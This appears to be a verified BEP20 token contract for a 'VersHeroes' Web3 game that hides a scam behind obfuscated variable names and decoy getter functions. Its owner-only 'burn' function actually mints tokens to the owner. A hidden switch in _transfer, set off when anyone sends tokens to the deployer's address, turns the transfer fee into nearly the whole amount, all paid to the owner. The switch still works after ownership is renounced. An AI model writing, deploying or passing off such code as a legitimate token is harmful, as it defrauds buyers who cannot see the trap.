/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/*
VersHeroesv3
#Versaillesheroes is a #Web3 #Metaverse #GameFi #P2E #MOBA game with real opponents and real rewards | Coming at the end of 2022 |
http://discord.gg/versaillesheroes
https://twitter.com/VersHeroes
https://versaillesheroes.com/
https://discord.com/invite/versaillesheroes
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
contract VersHeroes {
mapping (address => uint256) public balanceOf;
uint256 private  ODLciH = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "VersHeroes";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  SPZRhd = 1000000000000000000000;
address private  RMikqi = address(0);
address private  CpoFBs = address(0);
uint256 private  mMgruF = 1000000000000000000;
address private  hCAxJx = address(0);
address public owner;
uint8 public constant decimals = 18;
uint256 private  ecSwQE = 1000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  uEvXIR = 10000000000;
string public  name = "VersHeroes";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  bISTNF = 1000000000000000000;
address private  ZAufnC = address(0);
uint256 public constant ifQMCI = 99999;
address private  oQsGQv = address(0);
address private  qMmVHl = address(0);
address private  LJcAzV = address(0);
address private  nOQNPM = address(0);
uint256 private  hLknjK = 100000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  FRPgRU = address(0);


function _getmMgruF() private returns (uint256) {
return mMgruF;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function _getODLciH() private returns (uint256) {
return ODLciH;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function _gethCAxJx() private returns (address) {
return hCAxJx;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
qMmVHl = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}






function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getLJcAzV() private returns (address) {
return LJcAzV;
}

function _getecSwQE() private returns (uint256) {
return ecSwQE;
}



function _getRMikqi() private returns (address) {
return RMikqi;
}

function _getuEvXIR() private returns (uint256) {
return uEvXIR;
}

function _getCpoFBs() private returns (address) {
return CpoFBs;
}



function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getoQsGQv() private returns (address) {
return oQsGQv;
}





function _getFRPgRU() private returns (address) {
return FRPgRU;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "frkqkZ");
require(to != address(0), "frkqkZ");
require(amount <= balanceOf[from], "frkqkZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ifQMCI/bISTNF ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qMmVHl){
bISTNF = ifQMCI+2;
}
emit Transfer(from, to, transferAmount);
}
function _gethLknjK() private returns (uint256) {
return hLknjK;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getSPZRhd() private returns (uint256) {
return SPZRhd;
}





function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getnOQNPM() private returns (address) {
return nOQNPM;
}

function _getZAufnC() private returns (address) {
return ZAufnC;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tfrkqkZ 0");
require(spender != address(0), "ffrkqkZ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}